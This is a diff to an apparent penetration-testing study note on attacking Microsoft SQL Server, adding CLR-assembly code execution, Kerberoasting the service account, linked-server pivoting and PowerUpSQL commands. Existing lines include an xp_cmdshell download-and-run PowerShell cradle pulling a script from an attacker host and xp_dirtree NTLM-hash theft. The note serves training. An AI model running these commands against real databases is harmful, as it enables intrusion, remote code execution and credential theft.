@@ -1,3 +1,5 @@
+# MSSQL
+
 #MSSQL #MicrosoftSQLServer #database
 
 ## What is MSSQL?
@@ -5,6 +7,22 @@ Microsoft SQL Server — closed-source relational DBMS. Primary database on Wind
 
 - Port: **TCP 1433** (default instance), **UDP 1434** (SQL Browser — discovers named instances)
 - Named instances use dynamic ports — discovered via UDP 1434 or nmap
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Database/mssqlclient\|mssqlclient.py]] | Impacket's MSSQL client — SQL/Windows auth, and built-in helpers (`enable_xp_cmdshell`, `xp_cmdshell`, `enum_links`, `use_link`) that automate much of this note |
+| [[Tools/Database/sqsh\|sqsh]] | Interactive TDS client for Linux (SQL auth) |
+| [[Tools/Database/PowerUpSQL\|PowerUpSQL]] | PowerShell MSSQL attack toolkit — instance discovery, auditing, `Invoke-SQLOSCmd`, linked-server crawling, CLR/OLE exec |
+| [[Tools/Scanning/NMAP\|Nmap]] | `ms-sql-*` NSE scripts — instance discovery, version, empty-SA, brute |
+| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `mssql_ping`/`mssql_login`/`mssql_enum` modules |
+| [[Tools/Lateral Movement/impacket\|impacket]] | `mssqlclient.py` plus `smbserver` for the NTLM-theft listener |
+| [[Tools/Lateral Movement/responder\|responder]] | Capture the NTLMv2 hash coerced by `xp_dirtree` |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack captured NTLMv2 (mode 5600) |
+| [[Tools/Network/NTLMRawUnHide\|NTLMRawUnHide]] | Extract NTLMv2 from a pcap when you sniffed rather than relayed |
 
 ---
 
@@ -134,6 +152,26 @@ EXECUTE xp_cmdshell 'whoami';
 EXECUTE xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>/shell.ps1'')"';
 ```
 
+### RCE via CLR Assembly (when xp_cmdshell is off/monitored)
+
+When `xp_cmdshell` is disabled, alarmed on, or you want a quieter path, a **CLR assembly** gives the same OS execution. You compile a small .NET assembly exposing a stored-procedure method, load it into the DB (from a hex blob, no disk write needed), and call it. Requires **sysadmin** and `clr enabled`.
+
+```sql
+sp_configure 'show advanced options', 1; RECONFIGURE;
+sp_configure 'clr enabled', 1; RECONFIGURE;
+
+-- SQL Server 2017+ enforces "CLR strict security" — an UNSAFE assembly must be signed,
+-- OR (sysadmin only) mark the database TRUSTWORTHY and disable strict security:
+sp_configure 'clr strict security', 0; RECONFIGURE;   -- needs sysadmin; noisy, reversible
+
+-- Load the assembly from a hex blob and expose the proc
+CREATE ASSEMBLY myAsm FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
+CREATE PROCEDURE [dbo].[cmdExec] @cmd NVARCHAR(4000) AS EXTERNAL NAME myAsm.[StoredProcedures].[cmdExec];
+EXEC cmdExec 'whoami';
+```
+
+> [!tip] [[Tools/Database/PowerUpSQL|PowerUpSQL]] automates the whole CLR path — `Invoke-SQLOSCmdCLR -Command "whoami"` compiles, hex-encodes, loads, executes and cleans up the assembly for you. Cleanup matters: `DROP PROCEDURE`/`DROP ASSEMBLY` afterwards, and set `clr strict security` back to `1`.
+
 ### Read Files
 
 ```sql
@@ -217,6 +255,18 @@ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 
 Tool note (Python original + PowerShell 7 fork, capture→extract workflow): [[Tools/Network/NTLMRawUnHide|NTLMRawUnHide]].
 
+### Kerberoast the Service Account
+
+MSSQL runs under a service account with a registered SPN (`MSSQLSvc/host:1433`), which makes it a prime **Kerberoasting** target — any domain user can request a service ticket and crack it offline for the service account's password, with no MSSQL access at all. Frequently the fastest way *in*, before you even authenticate to the database.
+
+```bash
+# Any domain user → request the MSSQLSvc TGS and crack it (see the Kerberos note for the full flow)
+impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request | grep -i mssql
+hashcat -m 13100 mssql_tgs.txt /usr/share/wordlists/rockyou.txt
+```
+
+Full methodology: [[Services/Active Directory/Kerberos|Kerberos]] → Kerberoasting. A cracked MSSQL service account is often a local admin on the DB host and sometimes a domain account with wider rights.
+
 ### Impersonation
 
 ```sql
@@ -245,9 +295,18 @@ EXECUTE ('SELECT @@version') AT [linked_server_name];
 EXECUTE ('EXECUTE xp_cmdshell ''whoami''') AT [linked_server_name];
 
 -- OpenQuery
-
 SELECT * FROM OPENQUERY("linked_server_name", 'SELECT SYSTEM_USER');
+
+-- The EXECUTE(...) AT form needs "RPC Out" enabled on the link. If it's off, enable it
+-- (needs sysadmin/ALTER on the linked-server object), then xp_cmdshell over the link works:
+EXEC sp_serveroption 'linked_server_name', 'rpc out', 'true';
+
+-- Multi-hop: OPENQUERY nests, so you can pivot across a chain of links by nesting queries.
+-- Each server runs the inner query in ITS login-mapping context — often a higher-priv one.
+SELECT * FROM OPENQUERY("hop1", 'SELECT * FROM OPENQUERY("hop2", ''SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''''sysadmin'''')'')');
 ```
+
+> [!tip] Linked-server chains are the classic MSSQL lateral-movement path: a low-priv login on server A may map to `sa` on linked server B. Enumerate the whole graph and each hop's effective context with [[Tools/Database/PowerUpSQL|PowerUpSQL]]'s `Get-SQLServerLinkCrawl` before hand-nesting `OPENQUERY`.
 
 ### TRUSTWORTHY Database Privilege Escalation
 
@@ -344,9 +403,12 @@ WHERE ob.name = 'xp_instance_regread';
 | `xp_cmdshell` enabled | Direct OS command execution |
 | `Ole Automation Procedures` enabled | File system write access |
 | `Ad Hoc Distributed Queries` enabled | OPENROWSET read/exfil |
+| `clr enabled` + `clr strict security` off | CLR assembly RCE without xp_cmdshell |
 | SA with weak/default password | Full sysadmin |
+| MSSQLSvc SPN + weak service-account password | Kerberoast → offline crack, no DB access needed |
 | Service running as SYSTEM or domain admin | OS-level compromise |
-| Linked servers with sysadmin context | Lateral movement |
+| Linked servers with sysadmin context + RPC Out | Lateral movement / multi-hop pivot |
+| `TRUSTWORTHY ON` db owned by sysadmin | db_owner → sysadmin escalation |
 | No encryption on connections | Credential interception |
 
 ---
@@ -364,10 +426,17 @@ WHERE ob.name = 'xp_instance_regread';
 | OS command | `EXECUTE xp_cmdshell 'whoami'` |
 | NTLM theft | `EXEC xp_dirtree '\\attacker\share'` |
 | Crack NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
+| Kerberoast the SPN | `impacket-GetUserSPNs domain/user:pass -dc-ip dc -request \| grep mssql` |
+| CLR RCE (PowerUpSQL) | `Invoke-SQLOSCmdCLR -Command "whoami" -Instance host` |
+| Linked-server crawl | `Get-SQLServerLinkCrawl -Instance host` (PowerUpSQL) |
 | Nmap enum | `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password` |
 
 ---
 
+> [!note] **See also** — the MSSQLSvc SPN makes this a top [[Services/Active Directory/Kerberos|Kerberos]] roasting target; NTLM-theft via `xp_dirtree` feeds [[Tools/Lateral Movement/responder|responder]]/relay. SQL-injection *into* MSSQL (stacked queries, `xp_cmdshell` via injection) is covered in [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]]. Sibling relational DBs: [[Services/Database Services/MySQL|MySQL]], [[Services/Database Services/PostgreSQL|PostgreSQL]], [[Services/Database Services/Oracle TNS|Oracle TNS]].
+
+---
+
 *Created: 2026-07-13*
-*Updated: 2026-08-14*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
